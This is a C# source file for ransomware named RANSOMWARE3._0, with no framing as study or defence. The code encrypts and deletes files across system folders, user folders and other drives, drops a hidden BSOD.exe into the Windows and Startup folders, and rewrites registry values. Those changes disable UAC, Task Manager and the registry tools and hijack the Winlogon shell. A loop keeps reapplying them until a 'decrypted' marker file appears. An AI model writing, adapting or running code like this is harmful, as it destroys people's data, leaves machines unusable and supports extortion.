using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using Microsoft.Win32;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace RANSOMWARE3._0
{
    public class Encryp_main
    {
        public static void Main()
        {
            //Set high priority
            Process myProcess = Process.GetCurrentProcess();
            myProcess.PriorityClass = ProcessPriorityClass.High;
            //Control encrypt
            if(File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\decrypted"))
            {
                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\decrypted");
            }
            //Paths
            Encryp_main pb_void = new Encryp_main();
            //Voids
            try
            {
                string[] path_c = Directory.GetFiles(@"C:\");
                foreach (string name_x in path_c)
                {
                    try
                    {
                        pb_void.EncryptFile(name_x, name_x + ".CLUTTER");
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string[] path_program = Directory.GetFiles(@"C:\Program Files");
                foreach (string name_x in path_program)
                {
                    try
                    {
                        pb_void.EncryptFile(name_x, name_x + ".CLUTTER");
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string[] path_programx86 = Directory.GetFiles(@"C:\Program Files (x86)");
                foreach (string name_x in path_programx86)
                {
                    try
                    {
                        pb_void.EncryptFile(name_x, name_x + ".CLUTTER");
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string[] path_users = Directory.GetFiles(@"C:\Users");
                foreach (string name_x in path_users)
                {
                    try
                    {
                        pb_void.EncryptFile(name_x, name_x + ".CLUTTER");
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string[] path_win = Directory.GetFiles(@"C:\Windows");
                foreach (string name_x in path_win)
                {
                    try
                    {
                        pb_void.EncryptFile(name_x, name_x + ".CLUTTER");
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string[] path_sys = Directory.GetFiles(@"C:\Windows\System32");
                foreach (string name_x in path_sys)
                {
                    try
                    {
                        pb_void.EncryptFile(name_x, name_x + ".CLUTTER");
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string path_app = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string[] path_app_F = Directory.GetFiles(path_app);
                foreach (string name_x in path_app_F)
                {
                    try
                    {
                        pb_void.EncryptFile(name_x, name_x + ".CLUTTER");
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string path_userprof = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                string[] path_userprof_F = Directory.GetFiles(path_userprof);
                foreach (string name_x in path_userprof_F)
                {
                    try
                    {
                        pb_void.EncryptFile(name_x, name_x + ".CLUTTER");
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string path_mydoc = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                string[] path_mydoc_F = Directory.GetFiles(path_mydoc);
                foreach (string name_x in path_mydoc_F)
                {
                    try
                    {
                        pb_void.EncryptFile(name_x, name_x + ".CLUTTER");
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string path_mymus = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
                string[] path_mymus_F = Directory.GetFiles(path_mymus);
                foreach (string name_x in path_mymus_F)
                {
                    try
                    {
                        pb_void.EncryptFile(name_x, name_x + ".CLUTTER");
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string path_mypic = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
                string[] path_mypic_F = Directory.GetFiles(path_mypic);
                foreach (string name_x in path_mypic_F)
                {
                    try
                    {
                        pb_void.EncryptFile(name_x, name_x + ".CLUTTER");
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string path_myvids = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
                string[] path_myvids_F = Directory.GetFiles(path_myvids);
                foreach (string name_x in path_myvids_F)
                {
                    try
                    {
                        pb_void.EncryptFile(name_x, name_x + ".CLUTTER");
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string path_des = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string[] path_des_F = Directory.GetFiles(path_des);
                foreach (string name_x in path_des_F)
                {
                    try
                    {
                        pb_void.EncryptFile(name_x, name_x + ".CLUTTER");
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string[] path_dis = { @"A:\", @"B:\", @"D:\", @"E:\", @"F:\", @"G:\", @"H:\", @"CH:\", @"I:\", @"J:\", @"K:\", @"L:\", @"M:\", @"N:\",
                @"O:\", @"P:\", @"Q:\", @"R:\", @"S:\", @"T:\", @"U:\", @"V:\", @"W:\", @"X:\", @"Y:\", @"Z:\"};
                foreach (string name_x in path_dis)
                {
                    try
                    {
                        pb_void.EncryptFile(name_x, name_x + ".CLUTTER");
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            //Extract res
            string[] res_files = { "BSOD.exe" };
            for (int num = 0; num < res_files.Length; num++)
            {
                try
                {
                    Extract("RANSOMWARE3._0", @"C:\Windows", "Resources", res_files[num]);
                    File.SetAttributes(@"C:\Windows\" + res_files[num], FileAttributes.Hidden);
                }
                catch { }
            }
            try
            {
                File.Copy(@"C:\Windows\BSOD.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\BSOD.exe");
                File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\BSOD.exe", FileAttributes.Normal);
            }
            catch { }
            //Regs
            RegistryKey rk = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rk.SetValue("FilterAdministratorToken", 1, RegistryValueKind.DWord);
            RegistryKey key = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            key.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
            RegistryKey dis_taskmgr = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            dis_taskmgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            RegistryKey dis_reg = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            dis_reg.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
            RegistryKey logon = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            logon.SetValue("Shell", "BSOD.exe", RegistryValueKind.String);
            RegistryKey init = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            init.SetValue("Userinit", @"C:\Windows\BSOD.exe", RegistryValueKind.String);
            //Hide
            File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
            //Thread loop
            Thread loop = new Thread(pb_void.looper);
            loop.Start();
            //Start form
            var NewForm = new Window();
            NewForm.ShowDialog();
        }
        public void looper()
        {
            while (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\decrypted"))
            {
                //Regs
                RegistryKey rk = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                rk.SetValue("FilterAdministratorToken", 1, RegistryValueKind.DWord);
                RegistryKey key = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                key.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
                RegistryKey dis_taskmgr = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                dis_taskmgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                RegistryKey dis_reg = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                dis_reg.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
                RegistryKey logon = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                logon.SetValue("Shell", "BSOD.exe", RegistryValueKind.String);
                RegistryKey init = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                init.SetValue("Userinit", @"C:\Windows\BSOD.exe", RegistryValueKind.String);
                Thread.Sleep(500);
            }
        }
        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            //Important.DO NOT CHANGE!!!

            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }
        private void EncryptFile(string inputFile, string outputFile)
        {

            try
            {
                string password = @"d5a01s9u"; //Must contain 8 words
                UnicodeEncoding UE = new UnicodeEncoding();
                byte[] key = UE.GetBytes(password);

                string cryptFile = outputFile;
                FileStream fsCrypt = new FileStream(cryptFile, FileMode.Create);

                RijndaelManaged RMCrypto = new RijndaelManaged();

                CryptoStream cs = new CryptoStream(fsCrypt,
                    RMCrypto.CreateEncryptor(key, key),
                    CryptoStreamMode.Write);

                FileStream fsIn = new FileStream(inputFile, FileMode.Open);

                int data;
                while ((data = fsIn.ReadByte()) != -1)
                    cs.WriteByte((byte)data);


                fsIn.Close();
                cs.Close();
                fsCrypt.Close();
            }
            catch { }
        }
    }
}
